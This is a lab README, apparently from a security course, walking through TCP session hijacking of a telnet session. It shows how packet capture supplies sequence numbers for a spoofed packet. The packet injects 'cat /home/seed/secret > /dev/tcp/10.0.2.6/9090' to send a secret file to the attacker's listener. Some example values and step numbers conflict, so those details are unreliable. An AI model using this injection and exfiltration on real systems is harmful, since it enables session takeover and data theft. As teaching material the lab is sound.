## TCP Session Hijacking Attack

### Requirements 

In this lab, we will hijack a telnet session (between the victim client and the victim server) and inject a malicious command. In particular, the attacker wants to see the content of a secret file (stored on the server). At the end of this lab, if the attack is successful, the content of this secret file will be displayed in the attacker's terminal window.

### Setup

3 Linux VMs. VM1 as the victim (telnet client); VM2 as the telnet server; VM3 as the attacker. The 3 VMs reside in the same network. This README uses the following IP addresses.

| VM Name     | IP Address  |
|-------------|-------------|
| VM1         | 10.0.2.4    |
| VM2         | 10.0.2.5    |
| VM3         | 10.0.2.6    |

### Steps

1. let the client connect to the server using telnet.

![alt text](lab-tcp-hijack-telnet.png "Lab tcp session hijacking telnet")

2. the client uses this *echo* command to create a secret file on the server.

![alt text](lab-tcp-hijack-echo.png "Lab tcp session hijacking echo")

3. the client uses the *cat* command to confirm the file now exists:
![alt text](lab-tcp-hijack-cat.png "Lab tcp session hijacking cat")

3. let the attacker start monitoring network traffic using wireshark.

![alt text](lab-tcp-hijack-start-wireshark.png "Lab tcp hijack start wireshark")
![alt text](lab-tcp-hijack-start-capture.png "Lab tcp hijack start capture")

4. client produces some telnet packets. (any telnet packets, you can just type a command like *ls*).

![alt text](lab-tcp-hijack-ls.png "Lab tcp hijack ls command")

5. attacker stops wireshark capturing, and navigates to the latest packet sent from the client to the server.

This image shows the ip addresses, port numbers, sequence number, acknowledgment number.
![alt text](lab-tcp-hijack-capture1.png "Lab tcp hijack latest tcp capture - part 1")

This image shows the window size - still the same packet.
![alt text](lab-tcp-hijack-capture2.png "Lab tcp hijack latest tcp capture - part 2")

This image shows the ttl attribute - still the same packet.
![alt text](lab-tcp-hijack-capture3.png "Lab tcp hijack latest tcp capture - part 3")

6. the above packet provides the information which the attacker needs to know in order to perform the tcp reset attack. now, the attacker, mimicking the client, only needs to send one single regular TCP packet to the server. To send a regular TCP packet, a python script named send_tcp.py is provided. When running this script, it will send a TCP packet to a destination. You need to change the script so that the following 9 lines match with your situation.

```console
source_ip = "10.0.2.4"
destination_ip = "10.0.2.5"
source_port = 55202
destination_port = 23
sequence_num = 834051386
acknowledgment_num = 704733961
ttl_value = 64
window_size = 501
tcp_payload = "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"
```

**Note**: because the attacker is mimicking the client, thus the source ip address needs to be the client's IP address; from the captured latest packet, we can see the sequence number is *2523450797*, the acknowledgment number is *311613137*; the source port (in this example) is 57502, the destination port is 23. the tcp window size (in this example) is 245, the time to live (ttl) value is 64. The tcp data we can use is: "0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f61747461636b65725f69702f39303930200d".

**Explanation**: why the tcp data is "0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f61747461636b65725f69702f39303930200d"? Because the telnet command we want to inject is: "cat /home/seed/secret > /dev/tcp/attacker_ip/9090", and we want this command to be sandwiched by two newline signs "\r", so that the command will not be concatenated with other random strings. assume the atacker's IP address is 172.16.77.130, then this is how we can convert this whole thing into hex:

![alt text](lab-tcp-hijack-command-to-hex.png "Lab tcp hijack - the tcp data")

Thus in this example, the netwox 40 command we are going to type is:
![alt text](lab-tcp-hijack-command.png "Lab tcp hijack - the netwox command")

**Explanation 2**: why the telnet command we want to inject is "cat /home/seed/secret > /dev/tcp/attacker_ip/9090". Because "cat /home/seed/secret" shows the content of the secret file, but this command will only display the content in the victim client's terminal window, not in the attacker's terminal window. This "cat /home/seed/secret > /dev/tcp/attacker_ip/9090" will redirect the output of the cat command into a tcp port 9090 at the attacker's ip address. Thus we come to our next step,

7. before pressing enter, the attacker needs to open another terminal window so that the attacker can listen on a port - we will choose port 9090.

![alt text](lab-tcp-hijack-listening.png "Lab tcp hijacking attack listening on port 9090")

- after pressing enter:
![alt text](lab-tcp-hijack-after-enter.png "Lab tcp hijacking attack after enter command")

7. once the attacker pressed enter to execute the above *netwox 40* command, if the attack is successful, the victim server's secret file will be displayed in the attacker's terminal window:

![alt text](lab-tcp-hijack-success.png "Lab tcp session hijacking attack successful")

This indicates that the attack is successful and concludes the lab.
